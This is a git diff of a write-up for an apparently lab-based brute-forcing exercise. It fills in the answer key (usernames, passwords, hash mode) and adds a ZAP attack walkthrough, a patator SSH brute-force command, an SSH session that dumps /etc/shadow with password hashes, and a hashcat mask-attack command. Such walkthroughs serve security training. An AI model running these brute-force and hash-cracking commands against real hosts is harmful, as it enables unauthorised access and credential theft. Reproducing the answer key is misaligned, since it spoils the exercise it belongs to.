@@ -526,7 +526,7 @@ We did it! We got the username and password from scratch (sort of). Now, if you 
 <p><em>Answer the questions below</em></p>
 
 <p>6.1. What is the username you found? Hint: <em>Check the ZAP Fuzzer Payload</em><br>
-<code>____</code></p>
+<code>buster</code></p>
 
 
 <p>
@@ -560,22 +560,28 @@ We did it! We got the username and password from scratch (sort of). Now, if you 
 <br>
 
 
-
-<h6 align="center"><img width="300px" src="https://github.com/user-attachments/assets/14419050-1857-4d9e-9a54-4c09c684ce93"><br><br>
-                   <img width="300px" src=""><br><br>
-                   <img width="1200px" src=""><br><br>
-                   <img width="1200px" src=""></h6>
-
-
-<img width="333" height="343" alt="image" src="https://github.com/user-attachments/assets/757af97f-7621-43c0-9924-79e71d495541" />
+<img width="1167" height="692" alt="image" src="https://github.com/user-attachments/assets/9e058ba0-b968-4fda-a037-cdac90c1888a" />
 
 
 <br>
+<br>
+<p>
+
+- URL to attack: http://xx.xxx.xx.xx/vulnerabilities/brute/<br>
+- Use traditional spider: x<br>
+- Use ajax spider: x with FireFox<br>
+- <code>Attack</code><br>
+- Attack complete.<br>
+- <code>Report</code> > <code>Generate Report</code><br>
+
+
+</p>
+
+<img width="827" height="494" alt="image" src="https://github.com/user-attachments/assets/4338f556-f21c-4d13-9617-f38aad2cb074" />
+
 
 <p>6.2. What is their password? Hint: <em>Check the ZAP Fuzzer Payload</em><br>
-<code>____</code></p>
-
-
+<code>rhymes</code></p>
 
 <br>
 <h2>Task 7 . Brute forcing - SSH (Hydra + Patator)</h2>
@@ -584,20 +590,30 @@ We did it! We got the username and password from scratch (sort of). Now, if you 
 <p><em>Answer the questions below</em></p>
 
 <p>7.1. What is the SSH username?<br>
-<code>____</code></p>
+<code>tommyboy1</code></p>
+
+
+```bash
+:~/BruteForceHeroes# patator ssh_login host=10.201.76.75 user=FILE0 password=_@@_FILE1_@@_ 0=userlist.txt 1=found_passwords.txt -x ignore:mesg='Authentication failed.' -x quit:mesg!='Authentication failed.' -e _@@_:url
+```
+
+<img width="1226" height="245" alt="image" src="https://github.com/user-attachments/assets/2537ace0-21ca-40ab-8ee7-b724522dd8e4" />
 
 <br>
-
+<br>
 <p>7.2. What is their password (the encoded version) ?<br>
-<code>____</code></p>
+<code>1qaz%40WSX</code></p>
 
 <br>
 
 <p>7.3. What kind of encoding is this? <br>
-<code>____</code></p>
+<code>URL</code></p>
 
 
+<img width="1336" height="227" alt="image" src="https://github.com/user-attachments/assets/20ba32c4-a8dd-4b58-ab5e-416664a6e200" />
 
+
+<br>
 <br>
 <h2>Task 8 . Brute forcing - Hashes</h2>
 <p>Hash cracking? But I thought this was a brute force lab?<br>
@@ -673,12 +689,113 @@ One final note - If you look at the page for example hashes you'll notice there 
 <p><em>Answer the questions below</em></p>
 
 <p>8.1. Which user can we crack the password for? Hint: <em>read the shadow file</em><br>
-<code>____</code></p>
+<code>crackme</code></p>
 
 <br>
 
+
+```bash
+(rose) root@ip-10-201-55-35:~/BruteForceHeroes# ssh tommyboy1@10.201.76.75
+The authenticity of host '10.201.76.75 (10.201.76.75)' can't be established.
+ECDSA key fingerprint is SHA256:wVcK3uY4GTh+6D35fymJdFpO8IleALP0P0+MMPX6RXg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.201.76.75' (ECDSA) to the list of known hosts.
+tommyboy1@10.201.76.75's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat 13 Sep 00:29:12 UTC 2025
+
+  System load:  0.0               Processes:             104
+  Usage of /:   60.9% of 8.76GB   Users logged in:       0
+  Memory usage: 32%               IPv4 address for eth0: 10.201.76.75
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+58 updates can be applied immediately.
+17 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Sat Aug 28 16:15:10 2021 from 192.168.172.10
+tommyboy1@ip-10-201-76-75:~$
+```
+
+```bash
+tommyboy1@ip-10-201-76-75:~$ cat /etc/shadow
+root:*:18659:0:99999:7:::
+daemon:*:18659:0:99999:7:::
+bin:*:18659:0:99999:7:::
+sys:*:18659:0:99999:7:::
+sync:*:18659:0:99999:7:::
+games:*:18659:0:99999:7:::
+man:*:18659:0:99999:7:::
+lp:*:18659:0:99999:7:::
+mail:*:18659:0:99999:7:::
+news:*:18659:0:99999:7:::
+uucp:*:18659:0:99999:7:::
+proxy:*:18659:0:99999:7:::
+www-data:*:18659:0:99999:7:::
+backup:*:18659:0:99999:7:::
+list:*:18659:0:99999:7:::
+irc:*:18659:0:99999:7:::
+gnats:*:18659:0:99999:7:::
+nobody:*:18659:0:99999:7:::
+systemd-network:*:18659:0:99999:7:::
+systemd-resolve:*:18659:0:99999:7:::
+systemd-timesync:*:18659:0:99999:7:::
+messagebus:*:18659:0:99999:7:::
+syslog:*:18659:0:99999:7:::
+_apt:*:18659:0:99999:7:::
+tss:*:18659:0:99999:7:::
+uuidd:*:18659:0:99999:7:::
+tcpdump:*:18659:0:99999:7:::
+landscape:*:18659:0:99999:7:::
+pollinate:*:18659:0:99999:7:::
+usbmux:*:18846:0:99999:7:::
+sshd:*:18846:0:99999:7:::
+systemd-coredump:!!:18846::::::
+tommyboy1:$6$sOofVCulSPJdTck8$XpWS5BQL9eb9sZgGeTQsj0XhxjSOWCr8FHH33ZfgBqXP31rlwy086WRc.a6GShUFeKGzNqbCYEwGEq8Ye3Szb0:18846:0:99999:7:::
+lxd:!:18846::::::
+mysql:!:18846:0:99999:7:::
+crackme:$6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZrzaIRyddpknB.5UBr5E8jc0UDJTEDgIBNQFaKPizAlHsdfTScybDOa/:18867:0:99999:7:::
+ubuntu:!:20343:0:99999:7:::
+```
+
+
 <p>8.2. What mode do we need for the user's hash? Hint: <em>Check the example page and run a Find for the first 3 chars of the hash</em><br>
-<code>____</code></p>
+<code>1800</code></p>
+<p>
+
+- https://hashcat.net/wiki/doku.php?id=example_hashes</p>
+
+<img width="1540" height="89" alt="image" src="https://github.com/user-attachments/assets/8dc751e5-9d80-49a9-87ee-5e5791e41661" />
+
+```bash
+:~/BruteForceHeroes# hashcat -a 3 -m 1800 Hash ?d?d?u?d?d
+```
+
+
+
+
 
 <br>
 
